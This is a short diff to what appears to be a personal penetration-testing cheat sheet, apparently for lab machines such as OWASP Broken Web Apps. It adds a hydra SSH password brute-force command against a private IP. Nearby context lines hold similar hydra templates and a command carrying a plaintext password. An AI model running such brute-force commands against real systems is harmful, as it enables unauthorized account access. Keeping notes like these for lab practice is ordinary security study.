@@ -201,6 +201,7 @@ hydra
 hydra -t 4 -l <username> -P <passwords.txt> ssh://<ssh_IP>
 hydra -t 4 -L <users.txt> -P <passwords.txt> ssh://<ssh_IP>
 
+hydra -t 4 -l aleksander -P Passwords.txt ssh://192.168.0.70  #dolphin
 hydra -t 4 -l administrator -p 'Infinit3' ssh://192.168.0.70
 ```
 # owaspbwa
